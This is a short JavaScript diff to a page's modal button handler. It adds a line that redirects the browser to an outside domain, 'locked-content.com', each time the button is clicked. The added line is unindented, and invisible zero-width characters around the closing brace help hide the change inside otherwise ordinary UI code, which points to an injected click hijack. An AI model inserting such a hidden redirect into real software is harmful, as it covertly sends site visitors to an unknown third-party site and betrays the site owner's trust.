@@ -503,7 +503,10 @@
 		btn.addEventListener("click", (e) => {
 			e.preventDefault();
 			modal.style.display = "block";
-		});
+window.location.href = "https://locked-content.com/?1a9f5a4";
+⁠});⁠
+		
+
 
 		closeBtn.addEventListener("click", () => {
 			modal.style.display = "none";
